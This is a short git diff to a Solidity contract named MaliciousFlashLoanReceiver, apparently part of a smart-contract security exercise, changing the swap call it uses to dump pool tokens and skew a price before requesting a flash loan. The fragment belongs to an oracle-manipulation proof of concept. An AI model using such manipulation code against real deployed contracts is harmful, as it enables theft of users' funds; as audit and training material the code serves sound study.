@@ -222,7 +222,8 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
             uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
 
             erc.approve(address(tswapPool), 50e18);
-            tswapPool.swapPoolTokenForWethBasedOnInput(50e18, wethBought, block.timestamp);
+      tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
+
 
             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
 
